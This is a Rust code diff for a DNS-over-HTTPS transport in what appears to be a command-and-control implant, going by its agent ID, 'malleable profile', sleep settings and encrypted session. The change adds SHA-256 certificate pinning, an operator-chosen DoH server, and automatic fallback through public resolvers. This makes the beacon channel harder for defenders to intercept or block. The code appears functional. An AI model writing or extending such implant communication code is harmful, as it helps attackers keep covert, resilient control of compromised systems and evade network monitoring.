@@ -26,7 +26,10 @@ use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use common::config::{MalleableProfile, SleepConfig};
 use common::{CryptoSession, Message, Transport};
+use hex;
 use rand::seq::SliceRandom;
+use sha2::{Digest, Sha256};
+use std::sync::Arc;
 use tokio::time::Duration;
 
 const DOH_RESOLVERS: &[&str] = &[
@@ -34,6 +37,88 @@ const DOH_RESOLVERS: &[&str] = &[
     "https://dns.google/resolve",
     "https://dns.quad9.net/dns-query",
 ];
+
+/// Custom `ServerCertVerifier` that pins the server certificate by its
+/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
+/// end-entity certificate's DER encoding does not hash to the expected
+/// fingerprint, the TLS handshake is rejected.
+///
+/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
+/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
+/// CA-based verification.
+struct FingerprintVerifier {
+    expected_fingerprint: Option<String>,
+    webpki: rustls_0_21::client::WebPkiVerifier,
+}
+
+impl FingerprintVerifier {
+    fn new(expected_fingerprint: Option<String>) -> Self {
+        let mut root_store = rustls_0_21::RootCertStore::empty();
+        for cert in rustls_native_certs::load_native_certs()
+            .certs
+            .into_iter()
+            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
+        {
+            root_store.add(&cert).ok();
+        }
+        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
+        Self {
+            expected_fingerprint,
+            webpki,
+        }
+    }
+}
+
+impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
+    fn verify_server_cert(
+        &self,
+        end_entity: &rustls_0_21::Certificate,
+        intermediates: &[rustls_0_21::Certificate],
+        server_name: &rustls_0_21::ServerName,
+        scts: &mut dyn Iterator<Item = &[u8]>,
+        ocsp_response: &[u8],
+        now: std::time::SystemTime,
+    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
+        let digest = Sha256::digest(&end_entity.0);
+        let hex_fp = hex::encode(digest);
+
+        if let Some(ref expected) = self.expected_fingerprint {
+            if hex_fp != expected.to_lowercase() {
+                log::error!(
+                    "cert pinning: fingerprint mismatch (got {}, expected {})",
+                    hex_fp,
+                    expected
+                );
+                return Err(rustls_0_21::Error::InvalidCertificate(
+                    rustls_0_21::CertificateError::UnknownIssuer,
+                ));
+            }
+            log::debug!("cert pinning: fingerprint verified OK");
+            Ok(rustls_0_21::client::ServerCertVerified::assertion())
+        } else {
+            self.webpki
+                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
+        }
+    }
+
+    fn verify_tls12_signature(
+        &self,
+        message: &[u8],
+        cert: &rustls_0_21::Certificate,
+        dss: &rustls_0_21::DigitallySignedStruct,
+    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        self.webpki.verify_tls12_signature(message, cert, dss)
+    }
+
+    fn verify_tls13_signature(
+        &self,
+        message: &[u8],
+        cert: &rustls_0_21::Certificate,
+        dss: &rustls_0_21::DigitallySignedStruct,
+    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        self.webpki.verify_tls13_signature(message, cert, dss)
+    }
+}
 
 pub struct DohTransport {
     profile: MalleableProfile,
@@ -45,7 +130,12 @@ pub struct DohTransport {
 }
 
 impl DohTransport {
-    pub async fn new(profile: &MalleableProfile, session: CryptoSession, agent_id: String) -> Result<Self> {
+    pub async fn new(
+        profile: &MalleableProfile,
+        session: CryptoSession,
+        agent_id: String,
+        cert_fingerprint: Option<String>,
+    ) -> Result<Self> {
         let mut headers = reqwest::header::HeaderMap::new();
         headers.insert(
             reqwest::header::USER_AGENT,
@@ -56,10 +146,23 @@ impl DohTransport {
             reqwest::header::HeaderValue::from_static("application/dns-json"),
         );
 
-        let client = reqwest::Client::builder()
-            .use_rustls_tls()
-            .default_headers(headers)
-            .build()?;
+        // Build HTTP client with certificate pinning when configured.
+        let client = if cert_fingerprint.is_some() {
+            let verifier = FingerprintVerifier::new(cert_fingerprint);
+            let config = rustls_0_21::ClientConfig::builder()
+                .with_safe_defaults()
+                .with_custom_certificate_verifier(Arc::new(verifier))
+                .with_no_client_auth();
+            reqwest::Client::builder()
+                .use_preconfigured_tls(config)
+                .default_headers(headers)
+                .build()?
+        } else {
+            reqwest::Client::builder()
+                .use_rustls_tls()
+                .default_headers(headers)
+                .build()?
+        };
 
         Ok(Self {
             profile: profile.clone(),
@@ -71,19 +174,56 @@ impl DohTransport {
         })
     }
 
-    fn select_resolver(&self) -> &str {
+    /// Select the DoH resolver endpoint to use.
+    ///
+    /// If the configured `doh_server_url` is set, use it as the primary
+    /// endpoint.  Otherwise fall back to a random entry from the built-in
+    /// `DOH_RESOLVERS` list.
+    fn select_resolver(&self) -> String {
+        if let Some(ref url) = self.profile.doh_server_url {
+            if !url.is_empty() {
+                return url.clone();
+            }
+        }
         DOH_RESOLVERS
             .choose(&mut rand::thread_rng())
             .unwrap_or(&DOH_RESOLVERS[0])
+            .to_string()
     }
 
     async fn execute_query(&self, domain: &str, qtype: &str) -> Result<serde_json::Value> {
-        let resolver = self.select_resolver();
-        let url = format!("{}?name={}&type={}", resolver, domain, qtype);
+        // Try the primary resolver first; on failure, fall back through the
+        // built-in DOH_RESOLVERS list.
+        let primary = self.select_resolver();
+        let url = format!("{}?name={}&type={}", primary, domain, qtype);
 
-        let resp = self.client.get(&url).send().await?;
-        let json: serde_json::Value = resp.json().await?;
-        Ok(json)
+        match self.client.get(&url).send().await {
+            Ok(resp) => {
+                let json: serde_json::Value = resp.json().await?;
+                return Ok(json);
+            }
+            Err(e) => {
+                log::warn!("DoH query to {} failed: {}; trying fallback resolvers", primary, e);
+            }
+        }
+
+        // Fallback: try each built-in resolver in random order.
+        let mut fallbacks: Vec<&&str> = DOH_RESOLVERS.iter().collect();
+        fallbacks.shuffle(&mut rand::thread_rng());
+        for resolver in fallbacks {
+            let url = format!("{}?name={}&type={}", resolver, domain, qtype);
+            match self.client.get(&url).send().await {
+                Ok(resp) => {
+                    let json: serde_json::Value = resp.json().await?;
+                    return Ok(json);
+                }
+                Err(e) => {
+                    log::warn!("DoH fallback {} failed: {}", resolver, e);
+                    continue;
+                }
+            }
+        }
+        Err(anyhow!("All DoH resolvers failed for query '{}'", domain))
     }
 }
 
